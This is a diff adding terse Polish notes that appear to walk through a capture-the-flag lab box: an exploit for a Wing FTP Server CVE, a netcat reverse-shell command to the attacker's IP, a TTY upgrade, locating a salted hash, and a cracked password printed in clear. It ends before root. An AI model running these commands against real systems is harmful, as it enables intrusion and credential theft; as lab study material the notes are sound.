@@ -1,1 +1,19 @@
+1.znalezienie cve do wing ftp server v7.4.3
+2.otwarcie portu 443 na maszynie atakującej
+3.exploit: python3 cve.py -u 'http://ftp.wingdata.htb/' -U anonymous -c "nc 10.10.15.13 443 -e /bin/sh"
+4.ozywianie terminala;
+	python3 -c 'import pty; pty.spawn("/bin/bash")'
+	export TERM=xterm
+5. 
+	odczytanie zawartości /opt/wftpserver/Data =>	port do panelu admina oraz ip do panelu czyli 127.0.0.
 
+	ss -tulpn = panel administratora siedzi na 127.0.0.1:5466
+
+6. hasla i zabezpieczenia
+	znalezienie wackyxml z haslem zahashowanym w pliku /opt/wftpserver/Data/1/users/wacky.xml
+	znalezienie salta, jawnie zapisanego w /opt/wftpserver/Data/1/users.xml - WingFTP
+	uzycie hashcat do odszyfrowania -> !#7Blushing^*Bride5
+7 po zalogowaniu do ssh odczytanie user.txt
+8. dalsza exploitacja pod roota …..
+
+	
